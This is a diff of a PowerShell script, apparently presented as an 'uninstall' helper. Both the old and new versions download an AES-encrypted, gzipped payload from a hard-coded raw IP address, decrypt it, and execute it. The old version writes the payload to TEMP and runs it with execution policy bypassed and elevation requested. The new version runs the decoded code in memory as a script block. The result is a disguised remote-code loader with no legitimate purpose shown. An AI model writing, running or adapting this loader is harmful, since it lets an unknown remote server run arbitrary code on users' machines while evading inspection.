@@ -1,22 +1,36 @@
 $ErrorActionPreference = 'Stop'
-[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
 $B = 'http://51.75.118.5:20216'
 $T = 'tk-48232543-a9d6F'
 $U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
-$s = [Security.Cryptography.SHA256]::Create()
-$k = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))
-$v = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U|iv"))[0..15]
-$r = Invoke-RestMethod -UseBasicParsing "$B/s/$T/uninstall" -Headers @{ 'User-Agent' = $U; 'Cache-Control' = 'no-cache' }
-$d = [Convert]::FromBase64String(($r.d, $r.c | Where-Object { $_ })[0])
-$a = [Security.Cryptography.Aes]::Create()
-$a.Mode = 'CBC'; $a.Padding = 'PKCS7'; $a.Key = $k; $a.IV = $v
-$p = $a.CreateDecryptor().TransformFinalBlock($d, 0, $d.Length)
-$m = [IO.MemoryStream]::new($p)
-$g = [IO.Compression.GZipStream]::new($m, [IO.Compression.CompressionMode]::Decompress)
-$o = [IO.MemoryStream]::new()
-$g.CopyTo($o); $g.Dispose()
-$f = Join-Path $env:TEMP 'seven-uninstall.ps1'
-[IO.File]::WriteAllBytes($f, $o.ToArray())
-$adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
-if ($adm) { & powershell -NoProfile -ExecutionPolicy Bypass -File $f }
-else { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$f) }
+
+$sha = [Security.Cryptography.SHA256]::Create()
+$key = $sha.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))
+
+try {
+  $r = Invoke-RestMethod -Uri "$B/s/$T/uninstall" -UseBasicParsing -UserAgent $U -TimeoutSec 30
+} catch {
+  Write-Host "download failed: $($_.Exception.Message)" -ForegroundColor Red
+  return
+}
+if (-not $r.d) { Write-Host 'empty payload' -ForegroundColor Red; return }
+
+$aes = [Security.Cryptography.Aes]::Create()
+$aes.Mode = 'CBC'
+$aes.Padding = 'PKCS7'
+$aes.Key = [Convert]::FromBase64String($r.k)
+$aes.IV = [Convert]::FromBase64String($r.v)
+$dec = $aes.CreateDecryptor()
+$enc = [Convert]::FromBase64String($r.d)
+$gz = $dec.TransformFinalBlock($enc, 0, $enc.Length)
+
+$ms = New-Object IO.MemoryStream(,$gz)
+$zs = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)
+$sr = New-Object IO.StreamReader($zs)
+$src = $sr.ReadToEnd()
+$sr.Close(); $zs.Close(); $ms.Close()
+
+if (-not $src) { Write-Host 'empty source' -ForegroundColor Red; return }
+$sb = [ScriptBlock]::Create($src)
+& $sb
